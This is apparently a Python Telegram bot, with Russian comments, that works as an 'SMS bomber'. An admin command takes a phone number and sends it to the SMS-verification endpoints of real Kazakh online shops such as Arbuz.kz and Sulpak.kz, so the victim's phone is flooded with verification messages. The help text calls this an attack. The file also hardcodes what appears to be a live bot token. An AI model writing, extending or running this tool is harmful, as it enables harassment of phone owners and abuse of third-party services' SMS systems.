import telebot
import requests
import time

# --- НАСТРОЙКИ ---
TOKEN = '8671739196:AAFxqkpVJYHG8vqEHUqXBiVrKXa0XhGCoU0'
ADMIN_ID = 8504918918  # Твой ID цифрами

bot = telebot.TeleBot(TOKEN)

# Твоя база на 40 сервисов
SERVICES = {
    "Arbuz_KZ": {"url": "https://arbuz.kz/api/v1/user/verification/phone?phone=%PHONE%", "method": "GET"},
    "Sulpak_KZ": {"url": "https://www.sulpak.kz/Login/SmsCodeSignIn", "method": "POST", "data": {"phone": "%PHONE%"}},
    # ... сюда вставь все остальные свои сервисы ...
}

@bot.message_handler(commands=['start'])
def welcome(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, "🖥 Бот запущен на хостинге!\n\n/bomb [номер] - атака\n/status - проверка сервера")

@bot.message_handler(commands=['status'])
def status(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(ADMIN_ID, "✅ Сервер работает стабильно.")

@bot.message_handler(commands=['bomb'])
def start_bomb(message):
    if message.from_user.id == ADMIN_ID:
        target = message.text.replace('/bomb ', '').strip()
        if len(target) < 10:
            bot.send_message(ADMIN_ID, "❌ Введи номер!")
            return

        bot.send_message(ADMIN_ID, f"🚀 Запуск 40 сервисов на {target}...")
        count = 0
        for name, srv in SERVICES.items():
            try:
                url = srv['url'].replace('%PHONE%', target)
                if srv['method'] == "GET":
                    requests.get(url, timeout=5)
                else:
                    requests.post(url, data=srv.get('data'), timeout=5)
                count += 1
            except:
                continue
        bot.send_message(ADMIN_ID, f"✅ Готово! Сработало: {count}")

if __name__ == '__main__':
    print("Бот запущен...")
    bot.polling(none_stop=True)
